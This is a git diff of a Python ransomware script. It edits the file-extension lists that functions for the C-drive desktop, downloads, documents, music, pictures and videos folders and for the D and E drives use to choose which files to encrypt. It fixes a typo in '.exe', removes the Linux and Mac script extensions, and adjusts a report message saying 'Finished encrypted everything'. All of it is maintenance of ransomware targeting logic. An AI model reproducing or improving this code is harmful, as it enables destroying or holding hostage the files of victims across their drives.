@@ -210,7 +210,7 @@ def C_drive_desktop():
                         listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                         for l in listOfFiles:
                             EXTENSIONS = (
-                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
+                                '.exe', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                 '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                 '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                 '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
@@ -224,7 +224,6 @@ def C_drive_desktop():
                                 '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                 '.java', '.class', '.jar', # java source code
                                 '.ps', '.bat', '.vb', '.vbs' # windows based scripts
-                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                 '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                         
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
@@ -281,7 +280,7 @@ def C_drive_downloads():
                         listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                         for l in listOfFiles:
                             EXTENSIONS = (
-                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
+                                '.exe', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                 '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                 '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                 '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
@@ -295,7 +294,6 @@ def C_drive_downloads():
                                 '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                 '.java', '.class', '.jar', # java source code
                                 '.ps', '.bat', '.vb', '.vbs' # windows based scripts
-                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                 '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                         
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
@@ -352,7 +350,7 @@ def C_drive_documents():
                         listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                         for l in listOfFiles:
                             EXTENSIONS = (
-                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
+                                '.exe', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                 '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                 '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                 '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
@@ -366,7 +364,6 @@ def C_drive_documents():
                                 '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                 '.java', '.class', '.jar', # java source code
                                 '.ps', '.bat', '.vb', '.vbs' # windows based scripts
-                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                 '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                         
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
@@ -423,7 +420,7 @@ def C_drive_music():
                         listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                         for l in listOfFiles:
                             EXTENSIONS = (
-                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
+                                '.exe', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                 '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                 '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                 '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
@@ -437,7 +434,6 @@ def C_drive_music():
                                 '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                 '.java', '.class', '.jar', # java source code
                                 '.ps', '.bat', '.vb', '.vbs' # windows based scripts
-                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                 '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                         
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
@@ -494,7 +490,7 @@ def C_drive_pictures():
                         listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                         for l in listOfFiles:
                             EXTENSIONS = (
-                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
+                                '.exe', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                 '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                 '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                 '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
@@ -508,7 +504,6 @@ def C_drive_pictures():
                                 '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                 '.java', '.class', '.jar', # java source code
                                 '.ps', '.bat', '.vb', '.vbs' # windows based scripts
-                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                 '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                         
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
@@ -565,7 +560,7 @@ def C_drive_videos():
                         listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                         for l in listOfFiles:
                             EXTENSIONS = (
-                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
+                                '.exe', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                 '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                 '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                 '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
@@ -579,7 +574,6 @@ def C_drive_videos():
                                 '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                 '.java', '.class', '.jar', # java source code
                                 '.ps', '.bat', '.vb', '.vbs' # windows based scripts
-                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                 '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                         
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
@@ -637,7 +631,7 @@ def D_drive():
                         listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                         for l in listOfFiles:
                             EXTENSIONS = (
-                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
+                                '.exe', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                 '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                 '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                 '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
@@ -651,7 +645,6 @@ def D_drive():
                                 '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                 '.java', '.class', '.jar', # java source code
                                 '.ps', '.bat', '.vb', '.vbs' # windows based scripts
-                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                 '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                         
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
@@ -708,7 +701,7 @@ def E_drive():
                         listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                         for l in listOfFiles:
                             EXTENSIONS = (
-                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
+                                '.exe', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                 '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                 '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                 '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
@@ -722,7 +715,6 @@ def E_drive():
                                 '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                 '.java', '.class', '.jar', # java source code
                                 '.ps', '.bat', '.vb', '.vbs' # windows based scripts
-                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                 '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                         
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
@@ -798,7 +790,7 @@ embed = {
                 {
                     'name': '\u200b',
                     'value': f'''```
-Finished encrypted everything - Time to encrypt everything {(encrpyt_time)}seconds
+Finished encrypted everything - Time to encrypt everything {(encrpyt_time)} seconds
                         ```
                     ''',
                     'inline': True
